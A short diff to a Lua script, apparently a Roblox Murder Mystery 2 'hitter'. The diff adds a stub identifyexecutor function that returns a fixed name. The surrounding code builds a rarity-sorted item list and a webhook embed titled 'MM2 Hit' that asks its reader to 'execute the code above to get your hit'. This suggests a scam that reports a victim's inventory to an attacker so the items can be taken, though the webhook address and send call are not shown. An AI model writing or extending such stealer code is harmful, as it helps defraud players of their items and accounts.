@@ -1071,6 +1071,10 @@ local EverythingString = "-- // Uniques\n" .. uniquesString ..
                          "\n\n-- // Uncommon\n" .. uncommonString ..
                          "\n\n-- // Common\n" .. commonsString
 
+local function identifyexecutor()
+    return "ExecutorName"
+end
+
 local WebHookEmbed = CreateEmbed(
     "MM2 Hit",
     "Please execute the code above to get your hit.",
